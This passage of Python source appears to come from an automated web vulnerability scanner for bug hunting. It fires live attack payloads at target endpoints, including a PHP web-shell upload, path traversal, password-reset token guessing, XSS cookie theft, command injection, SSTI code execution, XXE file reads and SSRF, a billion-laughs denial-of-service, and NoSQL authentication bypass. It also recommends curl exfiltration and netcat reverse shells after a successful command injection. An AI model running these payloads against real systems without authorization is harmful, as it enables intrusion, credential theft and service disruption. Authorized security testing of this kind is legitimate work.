                    'Authorization': 'Bearer user_token',
                    'X-Role': 'admin',  # Try to escalate via header
                    'X-Admin': 'true'
                }
                
                response = self.session.get(test_url, headers=user_headers)
                
                test_result = {
                    'endpoint': test_url,
                    'test_type': 'Vertical privilege escalation',
                    'status_code': response.status_code,
                    'vulnerable': False
                }
                
                if response.status_code == 200:
                    test_result['vulnerable'] = True
                    test_result['vulnerability'] = 'Vertical privilege escalation - admin endpoint accessible'
                    access_results['vulnerabilities_found'].append(test_result)
                
                access_results['vertical_privilege_escalation'].append(test_result)
                
            except Exception as e:
                logger.debug(f"Vertical privilege escalation test error: {e}")
        
        return access_results

    async def _test_functionality_abuse(self, service_url: str) -> Dict[str, Any]:
        """Test for functionality abuse vulnerabilities"""
        abuse_results = {
            'file_upload_abuse': [],
            'password_reset_abuse': [],
            'feature_abuse': [],
            'vulnerabilities_found': []
        }
        
        # Test file upload abuse
        upload_endpoints = [
            '/api/upload', '/upload', '/api/file/upload',
            '/api/avatar/upload', '/api/document/upload'
        ]
        
        for endpoint in upload_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            try:
                # Test malicious file upload
                malicious_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
                    ('test.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
                    ('script.js', 'alert("XSS")', 'application/javascript'),
                    ('../../../etc/passwd', 'root:x:0:0:root:/root:/bin/bash', 'text/plain')
                ]
                
                for filename, content, content_type in malicious_files:
                    files = {'file': (filename, content, content_type)}
                    response = self.session.post(test_url, files=files)
                    
                    test_result = {
                        'endpoint': test_url,
                        'filename': filename,
                        'content_type': content_type,
                        'status_code': response.status_code,
                        'vulnerable': False
                    }
                    
                    if response.status_code in [200, 201]:
                        # Check if file was accepted
                        response_text = response.text.lower()
                        if any(keyword in response_text for keyword in ['uploaded', 'success', 'saved']):
                            test_result['vulnerable'] = True
                            test_result['vulnerability'] = f'Malicious file upload accepted: {filename}'
                            abuse_results['vulnerabilities_found'].append(test_result)
                    
                    abuse_results['file_upload_abuse'].append(test_result)
                    
            except Exception as e:
                logger.debug(f"File upload abuse test error: {e}")
        
        # Test password reset abuse
        reset_endpoints = [
            '/api/password/reset', '/api/auth/reset',
            '/password/reset', '/forgot-password'
        ]
        
        for endpoint in reset_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            try:
                # Test password reset token manipulation
                reset_tests = [
                    {'email': 'admin@example.com', 'description': 'Admin email reset'},
                    {'email': 'test@victim.com', 'user_id': 1, 'description': 'User ID manipulation'},
                    {'token': '123456', 'description': 'Predictable token'},
                    {'token': 'admin_token', 'description': 'Token manipulation'}
                ]
                
                for test_case in reset_tests:
                    response = self.session.post(test_url, json=test_case)
                    
                    test_result = {
                        'endpoint': test_url,
                        'test_case': test_case['description'],
                        'status_code': response.status_code,
                        'vulnerable': False
                    }
                    
                    if response.status_code in [200, 201]:
                        test_result['vulnerable'] = True
                        test_result['vulnerability'] = f'Password reset abuse: {test_case["description"]}'
                        abuse_results['vulnerabilities_found'].append(test_result)
                    
                    abuse_results['password_reset_abuse'].append(test_result)
                    
            except Exception as e:
                logger.debug(f"Password reset abuse test error: {e}")
        
        return abuse_results

    async def _privilege_escalation_testing(self) -> Dict[str, Any]:
        """Test privilege escalation scenarios"""
        logger.info("Starting privilege escalation testing")
        
        escalation_results = {
            'low_impact_to_high_impact': {},
            'vulnerability_chaining': {},
            'living_off_the_land': {}
        }
        
        # Test escalation from low-impact findings
        escalation_results['low_impact_to_high_impact'] = await self._test_impact_escalation()
        
        # Test vulnerability chaining
        escalation_results['vulnerability_chaining'] = await self._test_vulnerability_chaining()
        
        # Test living off the land techniques
        escalation_results['living_off_the_land'] = await self._test_living_off_land()
        
        return escalation_results

    async def _test_impact_escalation(self) -> Dict[str, Any]:
        """Test escalation from low-impact to high-impact vulnerabilities"""
        escalation_results = {
            'xss_to_session_hijack': [],
            'lfi_to_rce': [],
            'info_disclosure_to_access': []
        }
        
        # Simulate XSS to session hijacking escalation
        web_services = self._extract_web_services()
        
        for service_url in web_services[:2]:
            # Test for XSS first
            xss_payloads = [
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert(document.cookie)>',
                'javascript:alert(document.cookie)'
            ]
            
            for payload in xss_payloads:
                try:
                    test_url = f"{service_url}?search={payload}"
                    response = self.session.get(test_url)
                    
                    if payload in response.text:
                        # XSS found, test for session hijacking potential
                        escalation_test = {
                            'service_url': service_url,
                            'xss_payload': payload,
                            'xss_confirmed': True,
                            'session_hijack_potential': False,
                            'escalation_scenario': 'XSS to session hijacking'
                        }
                        
                        # Check if cookies are accessible via JavaScript
                        if 'httponly' not in response.headers.get('Set-Cookie', '').lower():
                            escalation_test['session_hijack_potential'] = True
                            escalation_test['vulnerability'] = 'XSS can be escalated to session hijacking'
                        
                        escalation_results['xss_to_session_hijack'].append(escalation_test)
                        
                except Exception as e:
                    logger.debug(f"XSS escalation test error: {e}")
        
        return escalation_results

    async def _test_vulnerability_chaining(self) -> Dict[str, Any]:
        """Test vulnerability chaining scenarios"""
        chaining_results = {
            'chains_discovered': [],
            'potential_chains': []
        }
        
        # Analyze discovered vulnerabilities for chaining potential
        for vuln in self.discovered_vulns:
            vuln_type = vuln.get('type', '')
            
            # Define chaining rules
            chaining_rules = {
                'information_disclosure': ['privilege_escalation', 'authentication_bypass'],
                'xss': ['session_hijacking', 'csrf'],
                'lfi': ['rce', 'information_disclosure'],
                'sqli': ['data_extraction', 'authentication_bypass'],
                'ssrf': ['internal_network_access', 'cloud_metadata_access']
            }
            
            if vuln_type in chaining_rules:
                potential_escalations = chaining_rules[vuln_type]
                
                chain_info = {
                    'initial_vulnerability': vuln,
                    'potential_escalations': potential_escalations,
                    'chain_feasibility': 'medium'
                }
                
                chaining_results['potential_chains'].append(chain_info)
        
        return chaining_results

    async def _test_living_off_land(self) -> Dict[str, Any]:
        """Test living off the land techniques"""
        lotl_results = {
            'system_utilities_abuse': [],
            'legitimate_tools_abuse': []
        }
        
        # Test if command execution is possible (simulated)
        web_services = self._extract_web_services()
        
        for service_url in web_services[:1]:
            # Test for command injection indicators
            command_payloads = [
                '; ls -la',
                '| whoami',
                '`id`',
                '$(uname -a)'
            ]
            
            for payload in command_payloads:
                try:
                    test_url = f"{service_url}?cmd={payload}"
                    response = self.session.get(test_url)
                    
                    # Check for command execution indicators
                    command_indicators = ['root', 'bin', 'usr', 'etc', 'var']
                    
                    if any(indicator in response.text for indicator in command_indicators):
                        lotl_test = {
                            'service_url': service_url,
                            'payload': payload,
                            'command_execution': True,
                            'living_off_land_potential': True,
                            'recommended_techniques': [
                                'Use curl to exfiltrate data',
                                'Use find to locate sensitive files',
                                'Use grep to search for credentials',
                                'Use netcat for reverse shells'
                            ]
                        }
                        
                        lotl_results['system_utilities_abuse'].append(lotl_test)
                        
                except Exception as e:
                    logger.debug(f"Living off the land test error: {e}")
        
        return lotl_results

    async def _analyze_exploitation_chains(self) -> List[Dict[str, Any]]:
        """Analyze and create exploitation chains"""
        logger.info("Analyzing exploitation chains")
        
        exploitation_chains = []
        
        # Group vulnerabilities by impact and type
        vuln_groups = {
            'information_disclosure': [],
            'injection': [],
            'authentication': [],
            'authorization': [],
            'configuration': []
        }
        
        for vuln in self.discovered_vulns:
            vuln_type = vuln.get('type', 'unknown')
            
            if 'disclosure' in vuln_type or 'information' in vuln_type:
                vuln_groups['information_disclosure'].append(vuln)
            elif any(inj_type in vuln_type for inj_type in ['xss', 'sqli', 'ssti', 'xxe']):
                vuln_groups['injection'].append(vuln)
            elif 'auth' in vuln_type:
                vuln_groups['authentication'].append(vuln)
            elif 'access' in vuln_type or 'privilege' in vuln_type:
                vuln_groups['authorization'].append(vuln)
            else:
                vuln_groups['configuration'].append(vuln)
        
        # Create exploitation chains
        if vuln_groups['information_disclosure'] and vuln_groups['injection']:
            chain = {
                'chain_id': 'info_to_injection',
                'description': 'Information disclosure leading to injection attack',
                'steps': [
                    {
                        'step': 1,
                        'action': 'Exploit information disclosure',
                        'vulnerabilities': vuln_groups['information_disclosure'][:1]
                    },
                    {
                        'step': 2,
                        'action': 'Use disclosed information for injection attack',
                        'vulnerabilities': vuln_groups['injection'][:1]
                    }
                ],
                'impact': 'High',
                'feasibility': 'Medium'
            }
            exploitation_chains.append(chain)
        
        if vuln_groups['authentication'] and vuln_groups['authorization']:
            chain = {
                'chain_id': 'auth_to_privesc',
                'description': 'Authentication bypass leading to privilege escalation',
                'steps': [
                    {
                        'step': 1,
                        'action': 'Bypass authentication',
                        'vulnerabilities': vuln_groups['authentication'][:1]
                    },
                    {
                        'step': 2,
                        'action': 'Escalate privileges',
                        'vulnerabilities': vuln_groups['authorization'][:1]
                    }
                ],
                'impact': 'Critical',
                'feasibility': 'High'
            }
            exploitation_chains.append(chain)
        
        return exploitation_chains

    def _identify_high_impact_findings(self) -> List[Dict[str, Any]]:
        """Identify high-impact findings from all tests"""
        high_impact_findings = []
        
        # Define high-impact vulnerability types
        high_impact_types = [
            'rce', 'sqli', 'authentication_bypass', 'privilege_escalation',
            'file_upload_rce', 'xxe', 'ssti', 'default_credentials'
        ]
        
        for vuln in self.discovered_vulns:
            vuln_type = vuln.get('type', '').lower()
            
            if any(high_type in vuln_type for high_type in high_impact_types):
                high_impact_findings.append({
                    'vulnerability': vuln,
                    'impact_level': 'Critical',
                    'exploitation_complexity': 'Low',
                    'business_impact': 'High'
                })
            elif vuln.get('vulnerable', False):
                # Check for other indicators of high impact
                vuln_desc = vuln.get('vulnerability', '').lower()
                if any(keyword in vuln_desc for keyword in ['admin', 'password', 'token', 'bypass']):
                    high_impact_findings.append({
                        'vulnerability': vuln,
                        'impact_level': 'High',
                        'exploitation_complexity': 'Medium',
                        'business_impact': 'Medium'
                    })
        
        return high_impact_findings

    def _generate_bug_hunt_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive bug hunting summary"""
        summary = {
            'total_vulnerabilities_found': len(self.discovered_vulns),
            'high_impact_vulnerabilities': len(self._identify_high_impact_findings()),
            'exploitation_chains_possible': len(self.exploitation_chains),
            'attack_surface_coverage': {},
            'recommended_next_steps': [],
            'critical_findings': []
        }
        
        # Analyze attack surface coverage
        tested_areas = []
        if results.get('contextual_exploitation'):
            tested_areas.append('Technology-specific exploitation')
        if results.get('advanced_fuzzing'):
            tested_areas.append('Advanced injection techniques')
        if results.get('business_logic_testing'):
            tested_areas.append('Business logic vulnerabilities')
        if results.get('privilege_escalation'):
            tested_areas.append('Privilege escalation scenarios')
        
        summary['attack_surface_coverage'] = {
            'areas_tested': tested_areas,
            'coverage_percentage': len(tested_areas) * 25  # Rough estimate
        }
        
        # Generate next steps based on findings
        if self.discovered_vulns:
            summary['recommended_next_steps'].append('Validate and exploit discovered vulnerabilities')
            summary['recommended_next_steps'].append('Perform manual verification of automated findings')
        
        if len(self.discovered_vulns) < 5:
            summary['recommended_next_steps'].append('Expand testing to additional attack vectors')
            summary['recommended_next_steps'].append('Perform authenticated testing if possible')
        
        summary['recommended_next_steps'].append('Test for business logic flaws specific to the application domain')
        summary['recommended_next_steps'].append('Perform social engineering and phishing assessments')
        
        return summary

    def _load_polyglot_payloads(self) -> List[Dict[str, Any]]:
        """Load polyglot payloads that can trigger multiple vulnerabilities"""
        return [
            {
                'payload': '"><script>alert(1)</script><img src=x onerror=alert(1)>{{7*7}}${7*7}<%=7*7%>',
                'targets': ['XSS', 'SSTI', 'Template Injection']
            },
            {
                'payload': "' OR '1'='1' UNION SELECT null,version(),user()--",
                'targets': ['SQLi', 'Information Disclosure']
            },
            {
                'payload': '{{7*7}}${7*7}<%=7*7%>#set($x=7*7)${x}',
                'targets': ['SSTI', 'Template Injection', 'Velocity', 'Freemarker']
            },
            {
                'payload': '../../../etc/passwd%00.jpg',
                'targets': ['LFI', 'Path Traversal', 'File Upload Bypass']
            },
            {
                'payload': '; cat /etc/passwd; echo "vulnerable"',
                'targets': ['Command Injection', 'RCE']
            }
        ]

    def _load_ssti_payloads(self) -> List[Dict[str, Any]]:
        """Load SSTI payloads for different template engines"""
        return [
            {
                'engine': 'Jinja2',
                'payloads': [
                    {'payload': '{{7*7}}', 'expected': '49'},
                    {'payload': '{{config}}', 'expected': 'Config'},
                    {'payload': "{{''.__class__.__mro__[2].__subclasses__()}}", 'expected': 'class'}
                ]
            },
            {
                'engine': 'Freemarker',
                'payloads': [
                    {'payload': '${7*7}', 'expected': '49'},
                    {'payload': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }', 'expected': 'uid='}
                ]
            },
            {
                'engine': 'Velocity',
                'payloads': [
                    {'payload': '#set($x=7*7)$x', 'expected': '49'},
                    {'payload': '#set($str=$class.inspect("java.lang.String").type)', 'expected': 'class'}
                ]
            },
            {
                'engine': 'Smarty',
                'payloads': [
                    {'payload': '{7*7}', 'expected': '49'},
                    {'payload': '{php}echo `id`;{/php}', 'expected': 'uid='}
                ]
            }
        ]

    def _load_xxe_payloads(self) -> List[Dict[str, Any]]:
        """Load XXE payloads for different attack scenarios"""
        return [
            {
                'type': 'file_disclosure',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
            },
            {
                'type': 'ssrf',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>
<root>&xxe;</root>'''
            },
            {
                'type': 'dos',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>'''
            }
        ]

    def _load_nosql_payloads(self) -> List[Dict[str, Any]]:
        """Load NoSQL injection payloads"""
        return [
            {
                'database': 'MongoDB',
                'type': 'authentication_bypass',
                'payload': '{"$ne": null}'
            },
            {
                'database': 'MongoDB',
                'type': 'data_extraction',
                'payload': '{"$where": "this.username == this.password"}'
            },
            {
                'database': 'MongoDB',
                'type': 'injection',
                'payload': '{"$gt": ""}'
            },
            {
                'database': 'CouchDB',
                'type': 'injection',
                'payload': '{"$regex": ".*"}'
            }
        ]